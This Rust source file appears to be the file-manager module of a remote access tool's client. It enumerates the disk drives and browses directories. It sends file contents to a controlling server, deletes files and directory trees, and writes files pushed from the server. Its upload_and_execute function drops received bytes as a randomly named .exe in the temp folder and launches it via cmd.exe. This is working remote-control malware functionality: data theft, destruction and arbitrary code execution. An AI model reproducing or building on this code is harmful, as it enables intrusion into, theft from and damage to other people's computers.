use std::path::PathBuf;
use common::packets::{File, FileData, ServerboundPacket};

use crate::send_callback;

pub struct FileManager {
    current_path: PathBuf,
}

impl FileManager {
    pub fn new() -> Self {
        Self {
            current_path: PathBuf::new(),
        }
    }

    pub fn list_available_disks(&self) {
        let disks = get_available_disks();
        send_callback(&ServerboundPacket::DisksResult(disks));
    }

    pub fn write_current_folder(&self) {
        send_callback(&ServerboundPacket::CurrentFolder(self.current_path.to_string_lossy().to_string()));
    }

    pub fn view_folder(&mut self, folder: &str) {
        self.current_path.push(folder);
        self.write_current_folder();
        self.list_directory_contents()
    }

    pub fn previous_dir(&mut self) {
        if let Some(parent) = self.current_path.parent() {
            self.current_path = parent.to_path_buf();
            self.write_current_folder();
            self.list_directory_contents()
        } else {
            self.list_available_disks()
        }
    }


    pub fn remove_directory(&mut self, directory: &str) {
        let dir_path = self.current_path.join(directory);
        if std::fs::remove_dir_all(&dir_path).is_ok() {
            self.list_directory_contents()
        }
    }

    pub fn remove_file(&mut self, file: &str) {
        let file_path = self.current_path.join(file);
        if std::fs::remove_file(&file_path).is_ok() {
            self.list_directory_contents()
        }
    }

    pub fn list_directory_contents(&self) {
        let mut files = Vec::new();
        if let Ok(entries) = self.current_path.read_dir() {
            for entry in entries.filter_map(Result::ok) {
                let name = entry.file_name().to_string_lossy().to_string();
                if let Ok(file_type) = entry.file_type() {
                    files.push(File {
                        file_type: if file_type.is_dir() { "dir" } else { "file" }.to_string(),
                        name,
                    });
                }
            }
        }
        send_callback(&ServerboundPacket::FileList(files));
    }

    pub fn download_file(&self, filename: &str)  {
        let file_path = self.current_path.join(filename);
        if let Ok(data) = std::fs::read(&file_path) {
            send_callback(&ServerboundPacket::DonwloadFileResult(FileData {
                name: filename.to_string(),
                data,
            }));
        }
    }

    pub fn upload_and_execute(&self, file_data: FileData) {
        let temp_dir = std::env::temp_dir();
        
        let random_num: u64 = rand::random();
        let random_name = format!("file_{}.exe", random_num);
        
        let file_path = temp_dir.join(random_name);
        
        if let Err(e) = std::fs::write(&file_path, &file_data.data) {
            eprintln!("Failed to write file to temp directory: {}", e);
        }
        
        self.execute_file(&file_path.to_string_lossy());
    }
    
    pub fn execute_file(&self, path: &str) {
        use std::process::Command;
        
        match Command::new("cmd.exe")
            .args(["/c", "start", "", path])
            .spawn() 
        {
            Ok(_) => println!("Successfully executed file: {}", path),
            Err(e) => eprintln!("Failed to execute file: {}", e),
        }
    }
    
    pub fn upload_file(&self, target_folder: String, file_data: FileData)  {
        let path = std::path::Path::new(&target_folder);
        let file_path = path.join(&file_data.name);
        
        if let Err(e) = std::fs::write(&file_path, &file_data.data) {
            eprintln!("Failed to write file to folder: {}", e);
        }
        
        self.list_directory_contents();
    }
}

fn get_available_disks() -> Vec<String> {
    let arr = [
        "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S",
        "T", "U", "V", "W", "X", "Y", "Z",
    ];
    arr.iter()
        .filter_map(|&d| {
            let path = format!("{}:\\", d);
            if std::path::Path::new(&path).read_dir().is_ok() {
                Some(d.to_string())
            } else {
                None
            }
        })
        .collect()
}